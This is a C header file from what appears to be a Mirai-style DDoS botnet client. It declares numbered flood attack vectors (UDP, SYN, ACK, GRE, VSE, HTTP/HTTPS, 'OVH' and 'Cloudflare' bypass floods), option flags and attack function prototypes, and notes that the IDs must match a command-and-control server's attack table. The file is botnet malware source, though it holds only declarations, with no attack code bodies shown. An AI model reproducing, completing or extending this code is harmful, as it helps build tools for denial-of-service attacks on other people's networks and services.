#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

/* ============================================================================
 * ATTACK VECTORS - Streamlined (removed duplicates)
 * Must match C&C attack.go AttackInfo.attackID values
 * ============================================================================ */
/* UDP Floods (0-7) */
#define ATK_VEC_UDP         0
#define ATK_VEC_UDPPLAIN    1
#define ATK_VEC_UDPHEX      2
#define ATK_VEC_SOCKET_RAW  3
#define ATK_VEC_SAMP        4
#define ATK_VEC_OVHUDP      5
#define ATK_VEC_DNS         6
#define ATK_VEC_VSE         7

/* TCP Floods (20-27) */
#define ATK_VEC_TCP         20
#define ATK_VEC_SYN         21
#define ATK_VEC_ACK         22
#define ATK_VEC_TCPFRAG     23
#define ATK_VEC_TCPBYPASS   24
#define ATK_VEC_XMAS        25
#define ATK_VEC_GREIP       26
#define ATK_VEC_MIXED       27

/* Special Attacks (40-42) */
#define ATK_VEC_HOMESLAM    40
#define ATK_VEC_UDPBYPASS   41
#define ATK_VEC_GREETH      42

/* HTTP/HTTPS (50-52) */
#define ATK_VEC_HTTP        50
#define ATK_VEC_HTTPS       51
#define ATK_VEC_BROWSEREM   52

/* Cloudflare (60) */
#define ATK_VEC_CF          60

#define ATK_VEC_MAX         64

/* ============================================================================
 * ATTACK OPTIONS - Must match C&C flagInfoLookup.flagID values
 * ============================================================================ */
#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_TCP_URG         11
#define ATK_OPT_TCP_ACK         12
#define ATK_OPT_TCP_PSH         13
#define ATK_OPT_TCP_RST         14
#define ATK_OPT_TCP_SYN         15
#define ATK_OPT_TCP_FIN         16
#define ATK_OPT_TCP_SEQNUM      17
#define ATK_OPT_TCP_ACKNUM      18
#define ATK_OPT_GCIP            19
#define ATK_OPT_HTTP_METHOD     20
#define ATK_OPT_HTTP_POST_DATA  21
#define ATK_OPT_HTTP_PATH       22
#define ATK_OPT_CONNS           24
#define ATK_OPT_SOURCE          25
#define ATK_OPT_MINLEN          26
#define ATK_OPT_MAXLEN          27
#define ATK_OPT_PAYLOAD         28
#define ATK_OPT_REPEAT          29
#define ATK_OPT_URL             30
#define ATK_OPT_HTTPS           31

/* ============================================================================
 * ATTACK STRUCTURES
 * ============================================================================ */
struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

/* ============================================================================
 * FUNCTION PROTOTYPES
 * ============================================================================ */
void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
uint32_t attack_get_opt_ip(int, struct attack_option *, int, uint8_t);

/* Attack method declarations - UDP */
static void attack_udp_generic(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_plain(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_hex(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_socket_raw(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_samp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_ovh(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_dns(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_vse(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - TCP */
static void attack_tcp_syn(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_ack(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_frag(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_bypass(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_xmas(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_mixed(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_raw(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - Special */
static void attack_homeslam(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udpbypass(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - HTTP */
static void attack_http(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_https(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_browserem(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_cf(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

#endif
